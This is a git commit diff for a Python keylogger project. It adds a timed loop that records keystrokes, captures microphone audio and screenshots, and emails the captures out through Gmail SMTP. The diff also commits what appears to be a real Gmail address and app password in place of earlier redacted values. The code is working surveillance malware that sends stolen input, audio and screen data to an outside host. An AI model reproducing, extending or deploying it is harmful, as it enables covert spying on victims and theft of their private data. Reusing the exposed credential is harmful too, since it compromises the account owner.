95e0ac3a60320078019bd5eff4d959c36f1784aa
JoshMcleods <160990042+JoshMcleods@users.noreply.github.com>
2025-07-14 14:19:35 +1000

    Created a timer to run  screenshot() and microphone() every 15 seconds for x amount of iterations, completing the input capture and email functionality, although is blocked by google due to security issues until encryption feature implemented

--- Keylogger/keylogger.py
+++ Keylogger/keylogger.py
@@ -33,26 +33,25 @@ sc_information = "screenshot.png"
 
 microphone_time = 10
 
+time_iteration = 15
+number_of_iterations_end = 2
+
 file_path = "//Users//joshuamcleod//Advanced-Python-Keylogger//Keylogger"
 extend = "//"
 
 
-email_address = "##redacted##"
-password = "##redacted##"  # use google app password
-toaddr = "##redacted##"  # disposable email of your choice
+email_address = "jcloud3264@gmail.com"
+password = "rpxw pjws legn voxv"  # use google app password
+toaddr = "jcloud3264@gmail.com"  # disposable email of your choice
 
 
 def send_email(filename, attachment, toaddr):
     fromaddr = email_address
 
     msg = MIMEMultipart()  # MIME(email) function
-
     msg['From'] = fromaddr
-
     msg['To'] = toaddr
-
     msg["Subject"] = "Log File"
-
     body = "Body_of_the_email"
 
     msg.attach(MIMEText(body, 'plain'))  # plain format
@@ -61,25 +60,17 @@ def send_email(filename, attachment, toaddr):
     attachment = open(attachment, 'rb')
 
     p = MIMEBase('application', 'octet-stream')  # settings for mimebase
-
     p.set_payload((attachment).read())
-
     encoders.encode_base64(p)
-
     p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
-
     msg.attach(p)
 
     s = smtplib.SMTP('smtp.gmail.com', 587)
-
     s.starttls()
-
     s.login(fromaddr, password)
-
     text = msg.as_string()
 
     s.sendmail(fromaddr, toaddr, text)
-
     s.quit()
 
 
@@ -110,11 +101,6 @@ def computer_information():
                 f"{i}: {device['name']} | Inputs: {device['max_input_channels']} | Outputs: {device['max_output_channels']}\n")
 
 
-computer_information()
-
-# clipboard function TO-DO
-
-
 def microphone():
     fs = 44100
     seconds = microphone_time
@@ -139,39 +125,58 @@ def screenshot():
 
 screenshot()
 
-count = 0
-keys = []
 
+number_of_iterations = 0
+currentTime = time.time()
+stoppingTime = time.time() + time_iteration
 
-def on_press(key):
-    global keys, count
+while number_of_iterations < number_of_iterations_end:
+    count = 0
+    keys = []
 
-    print(key)
-    keys.append(key)
-    count += 1
+    def on_press(key):
+        global keys, count, currentTime
 
-    if count >= 1:
-        count = 0
-        write_file(keys)
-        keys = []
+        print(key)
+        keys.append(key)
+        count += 1
+        currentTime = time.time()
 
+        if count >= 1:
+            count = 0
+            write_file(keys)
+            keys = []
 
-def write_file(keys):
-    with open(file_path + extend + keys_information, "a",) as f:
-        for key in keys:
-            k = str(key).replace("'", "")
-            if k.find("space") > 0:
-                f.write('\n')
-                f.close()
-            elif k.find("Key") == -1:
-                f.write(k)
-                f.close()
+    def write_file(keys):
+        with open(file_path + extend + keys_information, "a",) as f:
+            for key in keys:
+                k = str(key).replace("'", "")
+                if k.find("space") > 0:
+                    f.write('\n')
+                    f.close()
+                elif k.find("Key") == -1:
+                    f.write(k)
+                    f.close()
 
+    def on_release(key):
+        if key == Key.esc:
+            return False
+        if currentTime > stoppingTime:
+            return False
 
-def on_release(key):
-    if key == Key.esc:
-        return False
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
 
+    if currentTime > stoppingTime:
+        with open(file_path + extend + keys_information, "w") as f:
+            f.write(" ")
 
-with Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
+        microphone()
+
+        screenshot()
+        send_email(sc_information, file_path + extend + sc_information, toaddr)
+
+        number_of_iterations += 1
+
+        currentTime = time.time()
+        stoppingTime = time.time() + time_iteration
--- ReadME.md
+++ ReadME.md
@@ -53,3 +53,4 @@ Getting the public ip address using ipify.org has a max query per user, after th
 
 For the audio capture, channel 2 is a common default although if it does not capture audio input it could be due to the wrong input capture, so adding the d.default.device = (2, None) line can fix channel errors. Otherwise, the audio channels are printed to system info.txt and you can decide which audio device to capture from. If you would like to capture a longer .wav audio file changing the seconds is optional.
 
+If you do not encrypt the files before sending them your message will be automatically blocked by google as they present potential security issues.
